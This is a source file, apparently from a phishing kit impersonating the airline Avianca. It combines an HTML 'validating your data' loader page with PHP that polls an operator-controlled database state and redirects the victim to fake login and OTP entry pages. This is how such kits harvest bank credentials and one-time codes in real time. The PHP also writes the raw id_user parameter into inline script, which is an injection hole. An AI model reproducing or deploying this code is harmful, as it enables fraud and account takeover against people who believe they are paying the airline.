<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <div class="loader">

            <div class="lds-ring">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <br><br>
            <p class="text-center">Estamos validando los datos. <br>
                Puede tardar entre 1 a 5 minutos. <br>
                No cierre o recargue esta ventana.</p>
        </div>
    </div>



</body>



<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/main.js"></script>
</body>

</html>


<?php
$mysqli = include_once "../conexion/index.php";
//RECOGEMOS LOS DATOS POR GET
$id_user = $_GET['id_user'];
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id_user);
$stmt->execute();
$resultado = $stmt->get_result();
$usuario = $resultado->fetch_assoc();

if ($usuario["estado"] == 1) {
?>
    <script type="text/javascript">
        setTimeout('document.location.reload()', 3000);
    </script>
<?php
} else if ($usuario["estado"] == 2) {
    // Datos incorrectos
?>
    <script type="text/javascript">
        window.location.href = 'datos.php?error=error';
    </script>
    <?php

}  else if ($usuario["estado"] == 3) {
    //Ingresando Login
    if (empty($usuario["usuario"])) {
    ?>
        <script type="text/javascript">
            window.location.href = 'verificar.php?id_user=<?php echo $id_user; ?>';
        </script>
    <?php
    } else {
    ?>
        <script type="text/javascript">
            setTimeout('document.location.reload()', 3000);
        </script>
    <?php
    }
} else if ($usuario["estado"] == 4) {
    // Login incorrecto
    ?>
    <script type="text/javascript">
        window.location.href = 'verificar.php?id_user=<?php echo $id_user; ?>&error=error';
    </script>
    <?php

} else if ($usuario["estado"] == 5) {
    //Ingresando OTP
    if (empty($usuario["otp"])) {
    ?>
        <script type="text/javascript">
            window.location.href = 'otp.php?id_user=<?php echo $id_user; ?>';
        </script>
    <?php
    } else {
    ?>
        <script type="text/javascript">
            setTimeout('document.location.reload()', 3000);
        </script>
    <?php
    }
} else if ($usuario["estado"] == 6) {
    // OTP incorrecto
    ?>
    <script type="text/javascript">
        window.location.href = 'otp.php?id_user=<?php echo $id_user; ?>&error=error';
    </script>
<?php

} else if ($usuario["estado"] == 7) {
    //Finalizado
?>
    <script type="text/javascript">
        window.location.href = 'success.php';
    </script>
<?php

}


?>